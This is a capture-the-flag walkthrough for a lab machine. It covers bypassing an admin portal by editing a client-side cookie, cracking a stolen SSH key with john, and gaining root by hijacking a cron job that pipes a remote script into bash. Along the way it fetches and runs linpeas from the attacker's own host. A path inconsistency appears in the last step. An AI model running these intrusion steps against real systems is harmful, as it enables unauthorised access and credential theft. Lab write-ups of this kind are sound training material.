## **Machine IP**
> 10.10.161.104

## Inference
1. Found http and ssh running on the machine.
2. Used gobuster to find directories on the ip and found an admin portal.
3. The admin portal is using a javascript in backend to communicate the server.
4. Changed the javascript file `Cookies.set("SessionToken",statusOrCookie)` to `Cookies.set("SessionToken","")`, this will change the cookie to desired admin-cookie. 
5. We are in.
6. Page shows private RSA Key which is  a SSH Key.
7. We will copy the complete key and save it as `id_rsa`.
8. Then we will convert in into hash by 
```console
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
```
9. Then we will crack the hash by 
```console
john --wordlist=/usr/share/wordlist/rockyou.txt id_rsa.hash
```
10. Found the password *james13*.
11. Used the key to login by 
```
chmod 600 id_rsa && ssh -i id_rsa john@10.10.161.104
```
12. We are in and got user flag in `user.txt`.
13. We will download linpeas on aur host machine by 
```console
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
```
and will roll up a python https server in the same directory by 
```console
python3 -m http.server
```
14. Then we will download linpeas with 
```console
wget http://{your ip}:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```
15. Found a cron job which can download any script we want as **ROOT** `curl overpass.thm/downloads/src/buildscript.sh | bash`.
16. So we will create a fake buildscript.sh in `downloads/src/buildscript.sh` and add 
```console
cat /root/root.txt > /home/john/stuff.txt
```
script in buildscript.sh. 
17. We will update overpass.thm to our ip in `/etc/hosts`. 
18. Then we will run up new server in directory with `downloads/src/buildscript.sh`.
19. Read stuff.txt in `/home/james` and that is the root.txt.
